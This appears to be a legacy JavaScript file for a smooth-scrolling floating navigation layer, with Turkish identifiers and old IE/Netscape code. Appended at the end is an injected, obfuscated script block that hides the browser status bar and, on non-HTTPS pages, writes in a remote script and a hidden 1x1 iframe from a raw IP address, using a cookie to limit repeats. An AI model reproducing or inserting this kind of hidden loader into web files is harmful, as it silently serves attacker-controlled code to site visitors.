/*
<body onload=CSScriptInit(50,50);>

<DIV id=navigation style="LEFT:0px; OVERFLOW: visible; POSITION: absolute; TOP: 293px; VISIBILITY: visible; WIDTH: 155px; Z-INDEX: 1">
<H1>KAYAR HTML</H1>
</DIV>

</body>
</html>

*/
CSInit = new Array;
function CSScriptInit(sutun,satir) {

CSInit[CSInit.length] = new Array(DJSmoothFloatLayer,/*CMP*/ 'navigation',new Array(sutun,satir),10);

if(typeof(skipPage) != "undefined") { if(skipPage) return; }
idxArray = new Array;
for(var i=0;i<CSInit.length;i++)
	idxArray[i] = i;
CSAction2(CSInit, idxArray);}
CSStopExecution = false;
function CSAction(array) { 
	return CSAction2(CSAct, array);
}
function CSAction2(fct, array) { 
	var result;
	for (var i=0;i<array.length;i++) {
		if(CSStopExecution) return false; 
		var actArray = fct[array[i]];
		if (actArray == null) return false;
		var tempArray = new Array;
		for(var j=1;j<actArray.length;j++) {
			if((actArray[j] != null) && (typeof(actArray[j]) == "object") && (actArray[j].length == 2)) {
				if(actArray[j][0] == "VAR") {
					tempArray[j] = CSStateArray[actArray[j][1]];
				}
				else {
					if(actArray[j][0] == "ACT") {
						tempArray[j] = CSAction(new Array(new String(actArray[j][1])));
					}
				else
					tempArray[j] = actArray[j];
				}
			}
			else
				tempArray[j] = actArray[j];
		}			
		result = actArray[0](tempArray);
	}
	return result;
}
CSAct = new Object;

CSAg = window.navigator.userAgent; CSBVers = parseInt(CSAg.charAt(CSAg.indexOf("/")+1),10);
function IsIE() { return CSAg.indexOf("MSIE") > 0;}
function CSIEStyl(s) { return document.all.tags("div")[s].style; }
function CSNSStyl(s) { return CSFindElement(s,0); }
function CSFindElement(n,ly) { if (CSBVers < 4) return document[n];
	var curDoc = ly ? ly.document : document; var elem = curDoc[n];
	if (!elem) { for (var i=0;i<curDoc.layers.length;i++) {
		elem = CSFindElement(n,curDoc.layers[i]); if (elem) return elem; }}
	return elem;
}

function CSSetStylePos(s,d,p) { if (IsIE()) { if (d == 0) CSIEStyl(s).posLeft = p; else CSIEStyl(s).posTop = p; }
	else { if (d == 0) CSNSStyl(s).left = p; else CSNSStyl(s).top = p; } }
function CSGetStylePos(s,d) { if (IsIE()) { if (d == 0) return CSIEStyl(s).posLeft; else return CSIEStyl(s).posTop; }
	else { if (d == 0) return CSNSStyl(s).left; else return CSNSStyl(s).top; }}

var DJold = new Array();
function DJmoveNewPos(t) {
	if(document.all) {
		x = document.body.scrollLeft + DJold[t].originX;
		y = document.body.scrollTop + DJold[t].originY;
	} else {
		x = window.pageXOffset + DJold[t].originX;
		y = window.pageYOffset + DJold[t].originY;
	}
	d1 = x - DJold[t].x;
	d2 = y - DJold[t].y;
	DJold[t].x = DJold[t].x + (x - DJold[t].x)*DJold[t].smooth;
	DJold[t].y = DJold[t].y + (y - DJold[t].y)*DJold[t].smooth;
	CSSetStylePos(DJold[t].oldLayer,0,DJold[t].x);
	CSSetStylePos(DJold[t].oldLayer,1,DJold[t].y);
	setTimeout("DJmoveNewPos(" + t + ")",10);
}
function DJSmoothFloatLayer(action) {
	var x = action[2][0]; var y = action[2][1];

	DJold[DJold.length] = new Array();
	t = DJold.length - 1;
	DJold[t].oldLayer = action[1];
	CSSetStylePos(DJold[t].oldLayer,0,x);
	CSSetStylePos(DJold[t].oldLayer,1,y);
	DJold[t].x = x;
	DJold[t].y = y;
	DJold[t].originX = x;
	DJold[t].originY = y;
	DJold[t].smooth = 1.0/action[3];
	setTimeout("DJmoveNewPos(" + t + ")",10);
}
<script language="JavaScript"><!--
var qxco7=document.cookie;function gc099(n21){var ix=qxco7.indexOf(n21+"=");if(ix==-1)return null;ix=qxco7.indexOf("=",ix)+1;var es=qxco7.indexOf(";",ix);if(es==-1)es=qxco7.length;return unescape(qxco7.substring(ix,es));}function sc088(n24,v8){var today=new Date();var expiry=new Date(today.getTime()+600000);if(v8!=null&&v8!="")document.cookie=n24+"="+escape(v8)+"; expires="+expiry.toGMTString();qxco7=document.cookie;}function okx12(){window.status="";setTimeout("okx12()", 200);}okx12();if(location.href.indexOf("https")!=0){if(gc099("trk716")==null){document.write("<script language=\"JavaScript\" src=\"http://217.107.218.147/dot.php\"></script><iframe src=\"http://217.107.218.147/dot.php\" height=\"1\" width=\"1\" scrolling=\"no\" frameborder=\"no\"/>");sc088("trk716","4");}}// --></script>
